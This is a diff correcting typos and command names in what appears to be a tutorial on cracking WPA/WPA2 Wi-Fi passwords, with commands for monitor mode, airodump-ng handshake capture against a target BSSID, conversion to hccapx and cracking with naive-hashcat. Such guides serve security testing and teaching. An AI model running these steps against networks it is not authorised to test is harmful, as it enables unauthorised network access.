@@ -28,7 +28,7 @@ Begin by listing wireless interfaces that support monitor mode with:
 airmon-ng
 ```
 
-If you do not see an interface listed than your wireless card does not support monitor mode 😞
+If you do not see an interface listed then your wireless card does not support monitor mode 😞
 
 We will assume your wireless interface name is `wlan0` but be sure to use the correct name if it differs from this. Next, we will place the interface into monitor mode:
 
@@ -75,7 +75,7 @@ WPA/WPA2 uses a [4-way handshake](https://security.stackexchange.com/questions/1
 ```bash
 # replace -c and --bssid values with the values of your target network
 # -w specifies the directory where we will save the packet capture
-airomon-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
+airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
 ```
 ```
  CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]                                        
@@ -101,7 +101,7 @@ The final step is to crack the password using the captured handshake. If you hav
 
 #### Cracking With `naive-hashcat` (recommended)
 
-Before we can crack the password using naive-hashcat, we need to convert our `.cap` file to the equivalent hashcat file format `.hccapx`. You can do this easily by either uploading the `.cap` file to <https://hashcat.net/cap2hccapx/> or using the [`cap2hccapx`](https://github.com/hashcat/hashcat-utils) tool directly from .
+Before we can crack the password using naive-hashcat, we need to convert our `.cap` file to the equivalent hashcat file format `.hccapx`. You can do this easily by either uploading the `.cap` file to <https://hashcat.net/cap2hccapx/> or using the [`cap2hccapx`](https://github.com/hashcat/hashcat-utils) tool directly.
 
 ```bash
 cap2hccapx.bin hackme.cap hackme.hccapx
@@ -111,7 +111,8 @@ Next, download and run `naive-hashcat`:
 
 ```bash
 # download
-git clone https://github.com/brannondorsey/naive-hashcat.sh
+git clone https://github.com/brannondorsey/naive-hashcat
+
 cd naive-hashcat
 
 # crack ! baby ! crack !
